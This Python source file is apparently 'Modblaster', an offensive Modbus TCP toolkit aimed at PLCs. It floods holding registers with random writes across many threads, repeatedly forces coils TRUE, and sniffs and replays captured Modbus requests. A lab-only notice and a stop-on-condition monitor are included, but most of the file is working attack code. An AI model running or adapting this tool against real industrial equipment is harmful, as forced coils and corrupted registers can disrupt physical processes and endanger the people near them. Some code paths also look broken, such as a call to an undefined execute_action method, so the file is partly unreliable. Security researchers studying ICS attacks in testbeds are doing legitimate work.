#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Modblaster: Advanced Modbus TCP Flooding, Monitoring & Fuzzing Tool

Author: Ridpath (https://github.com/ridpath/modblaster)
Created: 2025-05
License: MIT

This tool is designed for educational use, security research, CTF challenges,
and lab-based red teaming of industrial control systems.

    LEGAL NOTICE:
    Do not run this against live industrial equipment.
    Authorized lab/testbed environments ONLY.

Features:
    - Supports Modbus FC6, FC15, FC16, FC22, FC23
    - Threaded flooding of coils and registers
    - Real-time monitor logic to stop on safety conditions
    - Sniffer/replay-ready architecture
    - Stats, progress bars, colored logging, YAML/CSV config support
"""


import argparse
import threading
import time
import random
import itertools
import logging
import socket
import struct
import subprocess
import sys
import yaml
import csv
from collections import deque


from pymodbus.client.sync import ModbusTcpClient
from pymodbus.exceptions import ModbusIOException
from pymodbus.pdu import ModbusRequest, ModbusResponse
from pymodbus.transaction import ModbusSocketFramer
from pymodbus.payload import BinaryPayloadBuilder  # if used
from pymodbus.register_read_message import ReadWriteMultipleRegistersRequest


import colorlog
from tqdm import tqdm
from rich.console import Console
from rich.table import Table
from rich.live import Live



handler = colorlog.StreamHandler()
handler.setFormatter(colorlog.ColoredFormatter(
    "%(log_color)s%(asctime)s [%(name)s] [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
    log_colors={
        'DEBUG': 'cyan',
        'INFO': 'green',
        'WARNING': 'yellow',
        'ERROR': 'red',
        'CRITICAL': 'red,bg_white',
    }
))

logger = colorlog.getLogger("main")
logger.addHandler(handler)
logger.setLevel(logging.INFO)

OPERATOR_MAPPING = {
    "eq": "==", "ne": "!=", "lt": "<", "gt": ">", "le": "<=", "ge": ">="
}

class AdvancedMonitor:
    def __init__(self, reg, mon_type, params, action):
        self.reg = int(reg)
        self.type = mon_type
        self.params = params
        self.action = action
        self.prev_value = None
        self.stable_start = None
        self.value_history = deque(maxlen=10)
        self.last_change_time = time.time()
        self.logger = colorlog.getLogger(f"monitor.{reg}")

    def check_condition(self, current_val):
        try:
            if current_val is None:
                self.logger.warning(f"[Monitor] current_val is None for reg {self.reg} — skipping evaluation.")
                return False

            self.logger.debug(f"[Monitor] Evaluating condition for reg {self.reg} ({self.type}) with value = {current_val}")

            if self.type == "simple":
                op, val = self.params
                if op not in OPERATOR_MAPPING:
                    raise ValueError(f"Invalid operator: {op}")
                python_op = OPERATOR_MAPPING[op]
                expression = f"{current_val} {python_op} {val}"
                result = eval(expression)
                self.logger.debug(f"[Monitor Eval] {expression} => {result}")
                return result

            elif self.type == "change":
                if self.prev_value is None:
                    self.logger.debug(f"[Monitor] First value seen for reg {self.reg}; setting prev_value to {current_val}")
                    return False
                changed = current_val != self.prev_value
                self.logger.debug(f"[Monitor] change: {self.prev_value} -> {current_val} => {changed}")
                return changed

            elif self.type == "stability":
                min_val, max_val, duration = self.params
                if min_val <= current_val <= max_val:
                    if self.stable_start is None:
                        self.stable_start = time.time()
                    elapsed = time.time() - self.stable_start
                    self.logger.debug(f"[Monitor] stable for {elapsed:.2f}s (target: {duration}s)")
                    return elapsed >= duration
                self.logger.debug(f"[Monitor] value {current_val} out of range ({min_val}-{max_val}), resetting timer.")
                self.stable_start = None
                return False

            elif self.type == "rate":
                threshold = self.params[0]
                if self.value_history:
                    last_val, last_time = self.value_history[-1]
                    time_diff = time.time() - last_time
                    if time_diff > 0:
                        rate = abs(current_val - last_val) / time_diff
                        self.logger.debug(f"[Monitor] rate = {rate:.2f} (threshold: {threshold})")
                        if rate > threshold:
                            return True
                self.value_history.append((current_val, time.time()))
                return False

            return False

        except Exception as e:
            self.logger.error(f"[Monitor] Condition check error on reg {self.reg}: {e}")
            return False


def parse_monitor_spec(spec):
    try:
        parts = spec.split(':')
        if len(parts) != 4:
            raise ValueError(f"Invalid monitor spec: {spec} (Expected format: type:reg:params:action)")
        mon_type, reg, params, action = parts
        reg = int(reg)

        if mon_type == "simple":
            op, val = params.split(',')
            params = (op, int(val))
        elif mon_type == "change":
            params = []
        elif mon_type == "stability":
            min_val, max_val, duration = params.split(',')
            params = (int(min_val), int(max_val), float(duration))
        elif mon_type == "rate":
            params = [float(params)]
        else:
            raise ValueError(f"Unsupported monitor type: {mon_type}")

        if action == "stop_flood":
            action = ["stop_flood"]
        else:
            action = action.split(',')

        return AdvancedMonitor(reg, mon_type, params, action)
    except Exception as e:
        logger.error(f"Monitor parse failed for '{spec}': {e}")
        return None

def attack_loop(host, port, duration, register, default_value, verbose, flood_event,
                unit_id, random_values, rate=None, burst=None, payload=None,
                function_code=16, max_retries=3, unit_ids=None, stats=None,
                progress=None, thread_id=0, verify_set=False):

    client = ModbusTcpClient(host, port=port)
    client.connect()
    end_time = time.time() + duration
    sleep_time = 1.0 / rate if rate else 0.0001  
    payload_cycle = itertools.cycle(payload) if payload and not isinstance(payload[0], str) else None
    request_cycle = itertools.cycle(payload) if payload and isinstance(payload[0], str) else None
    unit_id_cycle = itertools.cycle(unit_ids) if unit_ids else itertools.repeat(unit_id)
    retry_count = 0
    request_count = 0
    error_count = 0

    try:
        while time.time() < end_time and not flood_event.is_set():
            current_unit_id = next(unit_id_cycle)
            burst_start = time.time()
            if burst:
                burst_on, burst_off = burst
                while time.time() < burst_start + burst_on and not flood_event.is_set():
                    try:
                        if request_cycle:
                            request_str = next(request_cycle)
                            parts = request_str.split()
                            if parts[0] == "write_coil":
                                client.write_coil(int(parts[1]), bool(int(parts[2])), slave=int(parts[3]))
                            elif parts[0] == "write_register":
                                client.write_register(int(parts[1]), int(parts[2]), slave=int(parts[3]))
                            elif parts[0] == "write_multiple":
                                client.write_registers(int(parts[1]), [int(v) for v in parts[3:]], slave=int(parts[2]))
                            elif parts[0] == "mask_write":
                                client.mask_write_register(int(parts[1]), and_mask=int(parts[2]), or_mask=int(parts[3]), slave=int(parts[4]))
                        else:
                            write_value = next(payload_cycle) if payload_cycle else (
                                random.randint(0, 65535) if random_values else default_value)
                            if function_code == 6:
                                client.write_register(int(register), write_value, slave=int(current_unit_id))
                                if verify_set:
                                    rr = client.read_holding_registers(int(register), 1, slave=int(current_unit_id))
                                    if not rr.isError():
                                        if rr.registers[0] != write_value:
                                            logger.warning(f"Verify failed: reg {register} = {rr.registers[0]}, expected {write_value}")
                            elif function_code == 15:
                                client.write_coils(int(register), [bool(random.randint(0, 1)) for _ in range(200)], slave=int(current_unit_id))  # Increased to 200 coils
                            elif function_code == 16:
                                client.write_registers(int(register), [random.randint(0, 65535) for _ in range(200)], slave=int(current_unit_id))  # Increased to 200 registers
                            elif function_code == 22:
                                client.mask_write_register(int(register), and_mask=0xFFFF, or_mask=write_value, slave=int(current_unit_id))
                            elif function_code == 23:
                                values = [random.randint(0, 65535) for _ in range(50)]  # Increased to 50 registers
                                req = ReadWriteMultipleRegistersRequest(
                                    read_address=int(0x00),
                                    read_count=int(50),
                                    write_address=int(register),
                                    write_registers=values,
                                    slave=int(current_unit_id)
                                )
                                if verbose:
                                    logger.debug(f"Thread-{thread_id}: FC 23: read_addr={0x00}, read_count={50}, write_addr={register}, values={values[:5]}..., unit={current_unit_id}")
                                client.execute(req)
                        request_count += 1
                        retry_count = 0
                        if stats:
                            stats.update('requests')
                        if verbose:
                            logger.debug(f"Thread-{thread_id}: FC {function_code}: Wrote {write_value if not request_cycle else request_str} to reg/coil {register}")
                        if progress:
                            progress.update(1)
                        if sleep_time > 0:
                            time.sleep(sleep_time + random.uniform(0, 0.00005))  # Randomized timing
                    except ModbusIOException as e:
                        error_count += 1
                        retry_count += 1
                        if stats:
                            stats.update('errors')
                        if retry_count > max_retries:
                            logger.error(f"Thread-{thread_id}: Max retries exceeded for reg {register}")
                            break
                        sleep_time_exp = 0.01
                        logger.warning(f"Thread-{thread_id}: Retry {retry_count}/{max_retries} in {sleep_time_exp:.2f}s: {e}")
                        time.sleep(sleep_time_exp)
                time.sleep(burst_off)
            else:
                try:
                    if request_cycle:
                        request_str = next(request_cycle)
                        parts = request_str.split()
                        if parts[0] == "write_coil":
                            client.write_coil(int(parts[1]), bool(int(parts[2])), slave=int(parts[3]))
                        elif parts[0] == "write_register":
                            client.write_register(int(parts[1]), int(parts[2]), slave=int(parts[3]))
                        elif parts[0] == "write_multiple":
                            client.write_registers(int(parts[1]), [int(v) for v in parts[3:]], slave=int(parts[2]))
                        elif parts[0] == "mask_write":
                            client.mask_write_register(int(parts[1]), and_mask=int(parts[2]), or_mask=int(parts[3]), slave=int(parts[4]))
                    else:
                        write_value = next(payload_cycle) if payload_cycle else (
                            random.randint(0, 65535) if random_values else default_value)
                        if function_code == 6:
                            client.write_register(int(register), write_value, slave=int(current_unit_id))
                            if verify_set:
                                rr = client.read_holding_registers(int(register), 1, slave=int(current_unit_id))
                                if not rr.isError() and rr.registers[0] != write_value:
                                    logger.warning(f"Verify failed: reg {register} = {rr.registers[0]}, expected {write_value}")
                        elif function_code == 15:
                            client.write_coils(int(register), [bool(random.randint(0, 1)) for _ in range(200)], slave=int(current_unit_id))  # Increased to 200 coils
                        elif function_code == 16:
                            client.write_registers(int(register), [random.randint(0, 65535) for _ in range(200)], slave=int(current_unit_id))  # Increased to 200 registers
                        elif function_code == 22:
                            client.mask_write_register(int(register), and_mask=0xFFFF, or_mask=write_value, slave=int(current_unit_id))
                        elif function_code == 23:
                            values = [random.randint(0, 65535) for _ in range(50)]  # Increased to 50 registers
                            req = ReadWriteMultipleRegistersRequest(
                                read_address=int(0x00),
                                read_count=int(50),
                                write_address=int(register),
                                write_registers=values,
                                slave=int(current_unit_id)
                            )
                            if verbose:
                                logger.debug(f"Thread-{thread_id}: FC 23: read_addr={0x00}, read_count={50}, write_addr={register}, values={values[:5]}..., unit={current_unit_id}")
                            client.execute(req)
                    request_count += 1
                    retry_count = 0
                    if stats:
                        stats.update('requests')
                    if verbose:
                        logger.debug(f"Thread-{thread_id}: FC {function_code}: Wrote {write_value if not request_cycle else request_str} to reg/coil {register}")
                    if progress:
                        progress.update(1)
                    if sleep_time > 0:
                        time.sleep(sleep_time + random.uniform(0, 0.00005))  # Randomized timing
                except ModbusIOException as e:
                    error_count += 1
                    retry_count += 1
                    if stats:
                        stats.update('errors')
                    if retry_count > max_retries:
                        logger.error(f"Thread-{thread_id}: Max retries exceeded for reg {register}")
                        break
                    sleep_time_exp = 0.01
                    logger.warning(f"Thread-{thread_id}: Retry {retry_count}/{max_retries} in {sleep_time_exp:.2f}s: {e}")
                    time.sleep(sleep_time_exp)
    finally:
        client.close()
        if stats:
            stats.update('requests', request_count)
            stats.update('errors', error_count)
        logger.info(f"Thread-{thread_id} completed: {request_count} requests, {error_count} errors")

def monitor_all(host, port, monitors, logic, flood_event, verbose, unit_id, stats=None, progress=None):
    logger = colorlog.getLogger("monitor")
    client = ModbusTcpClient(host, port=port)
    client.connect()
    monitor_objs = []

    for spec in monitors:
        monitor = parse_monitor_spec(spec)
        if monitor:
            monitor_objs.append(monitor)

    try:
        logger.info(f"Started monitor loop on {len(monitor_objs)} registers with logic={logic.upper()}")

        while not flood_event.is_set():
            conditions_met = []

            for mon in monitor_objs:
                try:
                    rr = client.read_input_registers(mon.reg, 1, slave=unit_id)

                    if rr.isError():
                        logger.warning(f"[Monitor] Error reading register {mon.reg}")
                        conditions_met.append(False)
                        continue

                    current_val = rr.registers[0]

                    # Log initial value at startup
                    logger.info(f"[Startup Check] Reg {mon.reg} initial value = {current_val}")

                    if stats:
                        stats.update('monitor_reads')

                    logger.debug(f"[Monitor] Read reg {mon.reg} ({mon.type}) = {current_val}")

                    # Evaluate condition BEFORE updating prev_value
                    condition_met = mon.check_condition(current_val)
                    mon.prev_value = current_val  # update after evaluation

                    conditions_met.append(condition_met)

                    logger.debug(f"[Monitor] Check reg {mon.reg} => condition_met={condition_met}")

                    if condition_met:
                        logger.warning(f"[MONITOR TRIGGERED] Reg {mon.reg} ({mon.type}) matched condition")
                        mon.execute_action(client, flood_event)

                except Exception as e:
                    logger.error(f"[Monitor] Exception on reg {mon.reg}: {e}")
                    conditions_met.append(False)

            if logic == "any" and any(conditions_met):
                logger.critical("🚨 Monitor logic: ANY condition met – stopping flood")
                flood_event.set()

            elif logic == "all" and all(conditions_met):
                logger.critical("🚨 Monitor logic: ALL conditions met – stopping flood")
                flood_event.set()

            if progress:
                progress.update(0)

            time.sleep(0.5)

    finally:
        client.close()
        logger.info("Monitor loop exited.")

def modbus_sniffer(interface, port, replay_host, replay_port, flood_event,
                   verbose, filters=None, trigger_monitor=None, progress=None):
    logger = colorlog.getLogger("sniffer")
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
        sock.bind((interface, port))
    except Exception as e:
        logger.error(f"Socket error: {e}")
        return

    logger.info(f"Sniffing Modbus traffic on {interface}...")
    frame_cache = {}
    active_sniffing = trigger_monitor is None

    try:
        while not flood_event.is_set():
            if trigger_monitor and not active_sniffing:
                active_sniffing = trigger_monitor.is_set()
                if active_sniffing:
                    logger.warning("Sniffing activated by monitor trigger!")
            if not active_sniffing:
                time.sleep(0.5)
                if progress:
                    progress.update(0)
                continue
            packet = sock.recvfrom(65565)[0]
            eth_header = packet[:14]
            eth = struct.unpack("!6s6sH", eth_header)
            eth_protocol = socket.ntohs(eth[2])
            if eth_protocol != 8:
                continue
            ip_header = packet[14:34]
            iph = struct.unpack("!BBHHHBBH4s4s", ip_header)
            protocol = iph[6]
            s_addr = socket.inet_ntoa(iph[8])
            d_addr = socket.inet_ntoa(iph[9])
            if protocol != 6:
                continue
            tcp_header = packet[14 + iph[0] & 0xF * 4:14 + iph[0] & 0xF * 4 + 20]
            tcph = struct.unpack("!HHLLBBHHH", tcp_header)
            source_port = tcph[0]
            dest_port = tcph[1]
            if dest_port != port and source_port != port:
                continue
            data_start = 14 + iph[0] & 0xF * 4 + 20
            data = packet[data_start:]
            if data:
                try:
                    framer = ModbusSocketFramer(None)
                    request = framer.decode(data)
                    if isinstance(request, ModbusRequest):
                        if filters and (("fc" in filters and request.function_code != int(filters["fc"])) or
                                        ("unit" in filters and request.unit_id != int(filters["unit"]))):
                            continue
                        key = (s_addr, source_port, d_addr, dest_port, request.unit_id)
                        frame_cache[key] = (time.time(), request)
                        if verbose:
                            logger.info(f"Request: {s_addr}:{source_port} -> {d_addr}:{dest_port} | "
                                        f"UID: {request.unit_id} | FC: {request.function_code} "
                                        f"| Data: {request.encode().hex()}")
                    elif isinstance(request, ModbusResponse):
                        key = (d_addr, dest_port, s_addr, source_port, request.unit_id)
                        if key in frame_cache:
                            req_time, req = frame_cache[key]
                            latency = time.time() - req_time
                            if replay_host:
                                replay_client = ModbusTcpClient(replay_host, port=int(replay_port))
                                replay_client.connect()
                                replay_client.execute(req)
                                replay_client.close()
                                logger.warning(f"Replayed request to {replay_host}:{replay_port} | "
                                               f"Latency: {latency:.4f}s | FC: {req.function_code}")
                            if verbose:
                                logger.info(f"Response: {s_addr}:{source_port} -> {d_addr}:{dest_port} | "
                                            f"UID: {request.unit_id} | Latency: {latency:.4f}s | "
                                            f"Data: {request.encode().hex()}")
                            del frame_cache[key]
                except Exception as e:
                    if verbose:
                        logger.error(f"Decoding error: {e}")
    finally:
        sock.close()

def force_coil_loop(host, port, coil_addr, interval, verbose, unit_id, flood_event, stats=None, progress=None):
    logger = colorlog.getLogger(f"coil.{coil_addr}")
    client = ModbusTcpClient(host, port=port)
    client.connect()
    retry_count = 0
    max_retries = 5
    force_count = 0

    try:
        while not flood_event.is_set():
            try:
                client.write_coil(coil_addr, True, slave=unit_id)
                force_count += 1
                if stats:
                    stats.update('coil_forces')
                retry_count = 0
                if verbose:
                    logger.debug(f"Coil {coil_addr} forced TRUE")
                if progress:
                    progress.update(0)
                time.sleep(interval)
            except Exception as e:
                retry_count += 1
                if stats:
                    stats.update('errors')
                if retry_count > max_retries:
                    logger.error(f"Max retries exceeded for coil {coil_addr}")
                    break
                sleep_time = min(5, 0.1 * (2 ** retry_count))
                logger.warning(f"Retry {retry_count}/{max_retries} in {sleep_time:.1f}s: {e}")
                time.sleep(sleep_time)
    finally:
        client.close()
        logger.info(f"Coil {coil_addr} completed: {force_count} forces")

class Statistics:
    def __init__(self):
        self.start_time = time.time()
        self.requests = 0
        self.errors = 0
        self.monitor_reads = 0
        self.coil_forces = 0
        self.lock = threading.Lock()

    def update(self, key, value=1):
        with self.lock:
            if key == 'requests':
                self.requests += value
            elif key == 'errors':
                self.errors += value
            elif key == 'monitor_reads':
                self.monitor_reads += value
            elif key == 'coil_forces':
                self.coil_forces += value

    def get_stats(self):
        duration = max(time.time() - self.start_time, 0.001)
        return {
            "duration": duration,
            "requests": self.requests,
            "errors": self.errors,
            "request_rate": self.requests / duration,
            "error_rate": self.errors / duration,
            "monitor_reads": self.monitor_reads,
            "coil_forces": self.coil_forces
        }

    def print_summary(self):
        stats = self.get_stats()
        logger.info("\n" + "="*40)
        logger.info("      OPERATION SUMMARY")
        logger.info("="*40)
        logger.info(f"Duration:       {stats['duration']:.2f} seconds")
        logger.info(f"Total Requests: {stats['requests']}")
        logger.info(f"Errors:         {stats['errors']}")
        logger.info(f"Request Rate:   {stats['request_rate']:.2f} req/sec")
        logger.info(f"Error Rate:     {stats['error_rate']:.2f} errors/sec")
        logger.info(f"Monitor Reads:  {stats['monitor_reads']}")
        logger.info(f"Coil Forces:    {stats['coil_forces']}")
        logger.info("="*40)

def create_dashboard(stats, monitors, flood_event):
    console = Console()
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Metric", style="dim")
    table.add_column("Value")
    with Live(table, refresh_per_second=2, console=console) as live:
        while not flood_event.is_set():
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("Metric", style="dim")
            table.add_column("Value")
            if stats:
                s = stats.get_stats()
                table.add_row("Requests", str(s['requests']))
                table.add_row("Errors", str(s['errors']))
                table.add_row("Request Rate", f"{s['request_rate']:.2f} req/s")
                table.add_row("Error Rate", f"{s['error_rate']:.2f} err/s")
                table.add_row("Monitor Reads", str(s['monitor_reads']))
                table.add_row("Coil Forces", str(s['coil_forces']))
            for mon in monitors:
                status = "✔" if mon.check_condition(mon.prev_value or 0) else "✗"
                table.add_row(f"Monitor {mon.reg} ({mon.type})", f"{mon.prev_value or 'N/A'} [{status}]")
            live.update(table)
            time.sleep(0.5)

def main():
    parser = argparse.ArgumentParser(
        description="Advanced Modbus Pentesting Toolkit",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    parser.add_argument("--host", help="Target PLC IP address")
    parser.add_argument("--port", type=int, default=502, help="Modbus TCP port")
    parser.add_argument("--unit-id", type=int, nargs='+', default=[1], help="Modbus unit ID(s)")
    parser.add_argument("--force-coil", type=int, nargs='+', help="Coil addresses to force TRUE")
    parser.add_argument("--coil-interval", type=float, default=1.0, help="Interval between coil forces (seconds)")
    parser.add_argument("--set-reg", type=int, nargs='+', help="Holding registers to flood")
    parser.add_argument("--set-value", type=int, default=0, help="Default value to write")
    parser.add_argument("--random-values", action="store_true", help="Use random values")
    parser.add_argument("--function-code", type=int, default=16, choices=[6, 15, 16, 22, 23], help="Modbus function code")
    parser.add_argument("--monitor", action='append', help="Monitor: type:reg:params:action (e.g., simple:0:eq,0:stop_flood)")
    parser.add_argument("--monitor-file", help="CSV file with monitor specs (type,reg,params,action)")
    parser.add_argument("--monitor-logic", choices=["any", "all"], default="any", help="Monitor logic")
    parser.add_argument("--rate", type=float, help="Requests per second per thread")
    parser.add_argument("--burst", nargs=2, type=float, help="Burst mode: ON OFF seconds")
    parser.add_argument("--max-retries", type=int, default=3, help="Max retries for failed operations")
    parser.add_argument("--payload", nargs='+', help="Sequence of values or requests")
    parser.add_argument("--payload-file", help="File containing values or requests")
    parser.add_argument("--sniff", help="Interface for passive sniffing")
    parser.add_argument("--replay", nargs=2, help="Replay captured requests to HOST:PORT")
    parser.add_argument("--sniff-filter", help="Sniff filter: key=value (fc,unit,reg)")
    parser.add_argument("--sniff-trigger", action="store_true", help="Start sniffing on monitor condition")
    parser.add_argument("--threads", type=int, default=50, help="Total flooding threads")
    parser.add_argument("--duration", type=int, default=30, help="Attack duration in seconds")
    parser.add_argument("--verbosity", type=int, default=1, choices=[0, 1, 2], help="Verbosity: 0=quiet, 1=info, 2=debug")
    parser.add_argument("--log-file", help="Log to file")
    parser.add_argument("--statistics", action="store_true", help="Show statistics summary")
    parser.add_argument("--progress", action="store_true", help="Show progress bars")
    parser.add_argument("--progress-style", choices=["bar", "spinner", "minimal"], default="bar", help="Progress style")
    parser.add_argument("--config", help="Load arguments from YAML config file")
    parser.add_argument("--dry-run", action="store_true", help="Simulate operations without executing")
    parser.add_argument("--clear", action="store_true", help="Clear terminal before starting")
    parser.add_argument("--verify-set", action="store_true", help="Verify written register values")

    args = parser.parse_args()

    if args.config:
        try:
            with open(args.config, 'r') as f:
                config = yaml.safe_load(f)
            for key, value in config.items():
                if getattr(args, key, None) is None:
                    setattr(args, key, value)
            logger.info(f"Loaded configuration from {args.config}")
        except Exception as e:
            logger.error(f"Failed to load config: {e}")

    logger.setLevel({0: logging.CRITICAL, 1: logging.INFO, 2: logging.DEBUG}[args.verbosity])

    if args.log_file:
        file_handler = logging.FileHandler(args.log_file)
        file_handler.setFormatter(logging.Formatter("%(asctime)s [%(name)s] [%(levelname)s] %(message)s"))
        logger.addHandler(file_handler)

    if args.clear:
        print("\033[H\033[J", end="")

    stats = Statistics() if args.statistics else None
    progress_bar = None
    flood_event = threading.Event()
    sniff_trigger_event = threading.Event() if args.sniff_trigger else None

    if args.progress and args.progress_style == "bar":
        total_ops = args.threads * args.duration * (args.rate or 1)
        progress_bar = tqdm(total=int(total_ops), desc="Operations", unit="req", dynamic_ncols=True,
                            bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]")
    elif args.progress and args.progress_style == "spinner":
        progress_bar = tqdm(total=0, desc="Operations", unit="req", dynamic_ncols=True,
                            bar_format="{l_bar}{n_fmt} req [{elapsed}]")

    if args.dry_run:
        logger.info("Dry-run mode enabled, simulating operations...")
        logger.info(f"Host: {args.host}, Port: {args.port}, Unit IDs: {args.unit_id}")
        if args.set_reg:
            logger.info(f"Flooding registers {args.set_reg} with value {args.set_value}, FC {args.function_code}")
        if args.force_coil:
            logger.info(f"Forcing coils {args.force_coil} every {args.coil_interval}s")
        if args.monitor:
            logger.info(f"Monitoring: {args.monitor}, Logic: {args.monitor_logic}")
        if args.sniff:
            logger.info(f"Sniffing on {args.sniff}, Replay: {args.replay}")
        sys.exit(0)

    if not any([args.force_coil, args.set_reg, args.sniff, args.monitor]):
        logger.error("No operation specified! Use --force-coil, --set-reg, --sniff, or --monitor")
        sys.exit(1)

    monitors = []
    monitor_objs = []

    if args.monitor_file:
        try:
            with open(args.monitor_file, 'r') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    spec = f"{row['type']}:{row['reg']}:{row['params']}:{row['action']}"
                    monitors.append(spec)
        except Exception as e:
            logger.error(f"Monitor file load failed: {e}")
    else:
        monitors = args.monitor or []

    for spec in monitors:
        mon = parse_monitor_spec(spec)
        if mon:
            monitor_objs.append(mon)

    if args.verbosity > 0 and args.statistics and monitor_objs:
        threading.Thread(target=create_dashboard, args=(stats, monitor_objs, flood_event), daemon=True).start()

    if args.sniff:
        replay_host, replay_port = args.replay if args.replay else (None, None)
        filters = {}
        if args.sniff_filter:
            for f in args.sniff_filter.split(','):
                if '=' in f:
                    key, val = f.split('=')
                    filters[key.strip()] = val.strip()
        t = threading.Thread(
            target=modbus_sniffer,
            args=(args.sniff, args.port, replay_host, replay_port, flood_event,
                  args.verbosity > 1, filters, sniff_trigger_event, progress_bar),
            daemon=True
        )
        t.start()
        logger.info(f"Started passive sniffing on {args.sniff} with replay={bool(args.replay)}")
        if args.sniff_trigger:
            logger.info("Sniffing will activate when monitor condition is met")

    if args.force_coil:
        for coil in args.force_coil:
            t = threading.Thread(
                target=force_coil_loop,
                args=(args.host, args.port, coil, args.coil_interval,
                      args.verbosity > 1, args.unit_id[0], flood_event, stats, progress_bar),
                daemon=True
            )
            t.start()
            logger.info(f"Forcing coil {coil} every {args.coil_interval}s")

    if monitor_objs:
        logger.info(f"Monitoring {len(monitor_objs)} registers with {args.monitor_logic} logic")
        if sniff_trigger_event:
            sniff_trigger_event.set()

        def delayed_monitor():
            delay = 5
            logger.warning(f"[DELAY] Waiting {delay}s before monitor starts...")
            time.sleep(delay)
            monitor_all(args.host, args.port, monitors, args.monitor_logic,
                        flood_event, args.verbosity > 1, args.unit_id[0], stats, progress_bar)

        threading.Thread(target=delayed_monitor, daemon=True).start()

    if args.set_reg:
        payload = args.payload
        if args.payload_file:
            try:
                with open(args.payload_file, 'r') as f:
                    payload = [line.strip() for line in f if line.strip()]
                logger.info(f"Loaded {len(payload)} payloads from {args.payload_file}")
            except Exception as e:
                logger.error(f"Payload file error: {e}")
                payload = None
        if not payload:
            payload = None  

        num_regs = len(args.set_reg)
        threads_per_reg = max(1, args.threads // num_regs)
        threads = []
        logger.info(f"Starting {args.threads} threads across {num_regs} registers...")
        for i, reg in enumerate(args.set_reg):
            for j in range(threads_per_reg):
                thread_id = i * threads_per_reg + j
                t = threading.Thread(
                    target=attack_loop,
                    args=(args.host, args.port, args.duration, reg, args.set_value,
                          args.verbosity > 1, flood_event, args.unit_id[0], args.random_values,
                          args.rate, args.burst, payload, args.function_code,
                          args.max_retries, args.unit_id, stats, progress_bar, thread_id, args.verify_set),
                    daemon=True
                )
                t.start()
                threads.append(t)
        logger.info(f"Flooding {num_regs} registers with {threads_per_reg} threads each")

    try:
        start_time = time.time()
        while any(t.is_alive() for t in threading.enumerate() if t != threading.current_thread()):
            if stats and progress_bar and args.progress_style == "bar":
                elapsed = max(time.time() - start_time, 0.001)
                progress_bar.set_description(
                    f"Operations [R: {stats.requests} E: {stats.errors} T: {elapsed:.1f}s]"
                )
            time.sleep(0.5)
            if time.time() > start_time + args.duration:
                logger.info("Duration completed, stopping operations...")
                flood_event.set()
                break
    except KeyboardInterrupt:
        logger.critical("Keyboard interrupt detected, stopping operations...")
        flood_event.set()

    flood_event.set()
    if progress_bar:
        progress_bar.close()
    if stats:
        stats.print_summary()
    logger.info("All operations completed")
    sys.exit(0)

if __name__ == "__main__":
    main()
